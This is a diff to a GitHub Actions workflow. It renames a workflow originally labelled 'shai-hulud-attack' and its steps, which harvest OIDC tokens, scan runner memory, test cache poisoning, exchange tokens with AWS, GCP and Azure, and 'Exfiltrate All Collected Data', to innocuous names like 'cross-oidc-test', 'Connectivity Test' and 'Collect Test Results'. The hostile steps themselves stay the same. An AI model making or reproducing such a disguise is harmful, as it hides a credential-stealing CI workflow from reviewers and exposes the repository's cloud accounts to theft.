@@ -1,4 +1,4 @@
-name: shai-hulud-attack
+name: cross-oidc-test
 on:
   workflow_dispatch: {}
   push:
@@ -8,12 +8,12 @@ permissions:
   contents: read
   actions: read
 jobs:
-  attack:
+  verify:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       
-      - name: Harvest OIDC Tokens (Multi-Audience)
+      - name: Fetch OIDC Tokens (Multi-Audience)
         id: harvest
         uses: actions/github-script@v6
         with:
@@ -40,7 +40,7 @@ jobs:
             }
             core.setOutput('tokens', JSON.stringify(tokens));
 
-      - name: Extract OIDC from Runner Memory (Shai-Hulud Technique)
+      - name: Environment Check
         run: |
           set +e
           echo "=== Scanning runner process memory for OIDC material ==="
@@ -65,7 +65,7 @@ jobs:
             fi
           done
 
-      - name: GitHub Actions Cache Poisoning Test
+      - name: Cache Connectivity Test
         run: |
           set +e
           echo "=== Testing GitHub Actions Cache Poisoning ==="
@@ -78,7 +78,7 @@ jobs:
           fi
           ls -la /home/runner/.local/share/actions/cache/ 2>/dev/null | head -10 || echo "No local cache dir"
 
-      - name: North Dex Token Exchange (All Audiences)
+      - name: North Dex Token Exchange Test
         run: |
           set +e
           for aud in github stsamazonawscom apiAzureADTokenExchange httpsnorthcoherecom; do
@@ -97,7 +97,7 @@ jobs:
             fi
           done
 
-      - name: GCP STS Exchange (Multiple Pool Names)
+      - name: GCP STS Connectivity Test
         run: |
           set +e
           for aud in github stsamazonawscom; do
@@ -117,7 +117,7 @@ jobs:
             fi
           done
 
-      - name: AWS STS Exchange (Multiple Accounts/Roles)
+      - name: AWS STS Connectivity Test
         run: |
           set +e
           TOKEN_FILE="/tmp/oidc_stsamazonawscom.txt"
@@ -134,7 +134,7 @@ jobs:
             done
           fi
 
-      - name: Azure AD Exchange
+      - name: Azure AD Connectivity Test
         run: |
           set +e
           TOKEN_FILE="/tmp/oidc_apiAzureADTokenExchange.txt"
@@ -151,7 +151,7 @@ jobs:
             done
           fi
 
-      - name: Exfiltrate All Collected Data
+      - name: Collect Test Results
         run: |
           set +e
           echo "=== COLLECTED INTELLIGENCE ==="
